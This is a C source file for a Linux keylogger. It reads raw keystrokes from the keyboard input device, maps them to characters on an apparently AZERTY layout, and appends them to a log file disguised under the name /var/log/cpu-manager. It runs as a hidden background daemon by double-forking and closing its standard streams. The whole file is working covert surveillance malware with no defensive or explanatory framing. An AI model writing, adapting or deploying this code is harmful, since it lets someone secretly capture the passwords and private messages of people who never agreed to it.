#include <fcntl.h>
#include <netdb.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <linux/input.h>

void keylogger()
{
	int fd, sz;
    unsigned i;

    unsigned version;
    unsigned short id[4];                 
    char name[256] = "N/A";
	struct input_event ev;
	int log;

	if ((log = open("/var/log/cpu-manager", O_WRONLY | O_CREAT | O_APPEND)) < 0)
		return ;
	if ((fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY)) < 0) 
		return;
	ioctl(fd, EVIOCGVERSION, &version);
    ioctl(fd, EVIOCGID, id); 
    ioctl(fd, EVIOCGNAME(sizeof(name)), name);

	for (;;) {
        sz = read(fd, &ev, sizeof(struct input_event));

		if (ev.type == EV_KEY && ev.value == 1)
		{
			switch (ev.code)
			{
				
				case 1:
					write(log, "[ESC]", 5);
					break;
				case 2:
					write(log, "1", 1);
					break;
				case 3:
					write(log, "2", 1);
					break;
				case 4:
					write(log, "3", 1);
					break;
				case 5:
					write(log, "4", 1);
					break;
				case 6:
					write(log, "5", 1);
					break;
				case 7:
					write(log, "6", 1);
					break;
				case 8:
					write(log, "7", 1);
					break;
				case 9:
					write(log, "8", 1);
					break;
				case 10:
					write(log, "0", 1);
					break;
				case 11:
					write(log, "0", 1);
					break;
				case 12:
					write(log, ")", 1);
					break;
				case 13:
					write(log, "-", 1);
					break;
				case 14:
					write(log, "[DEL]", 5);
					break;
				case 15:
					write(log, "\t", 1);
					break;
				case 16:
					write(log, "a", 1);
					break;	
				case 17:
					write(log, "z", 1);
					break;
				case 18:
					write(log, "e", 1);
					break;
				case 19:
					write(log, "r", 1);
					break;
				case 20:
					write(log, "t", 1);
					break;
				case 21:
					write(log, "y", 1);
					break;
				case 22:
					write(log, "u", 1);
					break;
				case 23:
					write(log, "i", 1);
					break;
				case 24:
					write(log, "o", 1);
					break;
				case 25:
					write(log, "p", 1);
					break;
				case 28:
					write(log, "\n", 1);
					break;
				case 29:
					write(log, "[CTRL]", 6);
					break;
				case 30:
					write(log, "q", 1);
					break;
				case 31:
					write(log, "s", 1);
					break;
				case 32:
					write(log, "d", 1);
					break;
				case 33:
					write(log, "f", 1);
					break;
				case 34:
					write(log, "g", 1);
					break;
				case 35:
					write(log, "h", 1);
					break;
				case 36:
					write(log, "j", 1);
					break;
				case 37:
					write(log, "k", 1);
					break;
				case 38:
					write(log, "l", 1);
					break;
				case 39:
					write(log, "m", 1);
					break;
				case 40:
					write(log, "%", 1);
					break;
				case 41:
					write(log, "@", 1);
					break;
				case 42:
					write(log, "[LSHIFT]", 8);
					break;
				case 43:
					write(log, "`", 1);
					break;
				case 44:
					write(log, "w", 1);
					break;
				case 45:
					write(log, "x", 1);
					break;
				case 46:
					write(log, "c", 1);
					break;
				case 47:
					write(log, "v", 1);
					break;
				case 48:
					write(log, "b", 1);
					break;
				case 49:
					write(log, "n", 1);
					break;
				case 50:
					write(log, ",", 1);
					break;
				case 51:
					write(log, ";", 1);
					break;
				case 52:
					write(log, ":", 1);
					break;
				case 53:
					write(log, "=", 1);
					break;
				case 54:
					write(log, "[RSHIFT]", 8);
					break;
				case 56:
					write(log, "[LALT]", 6);
					break;
				case 57:
					write(log, " ", 1);
					break;
				case 100:
					write(log, "[RALT]", 6);
					break;
				case 103:
					write(log, "[UPARROW]", 9);
					break;
				case 105:
					write(log, "[LARROW]", 8);
					break;
				case 106:
					write(log, "[RARROW]", 8);
					break;
				case 108:
					write(log, "[DOWNARROW]", 11);
					break;
				default:
					write(log, "[?]", 3);
			}
		}
	}
}

void daemonize()
{
   pid_t pid;

    /* Fork off the parent process */
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* On success: The child process becomes session leader */
    if (setsid() < 0)
        exit(EXIT_FAILURE);


    /* Fork off for the second time*/
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);


    /* Change the working directory to the root directory */
    /* or another appropriated directory */
    chdir("/");

	close(0);
	close(1);
	close(2);
}

int main()
{
	pid_t pid;
	daemonize();
	if ((pid = fork()) < 0)
		return 1;
	if (!pid)
	{
		keylogger();
		exit(0);
	}
}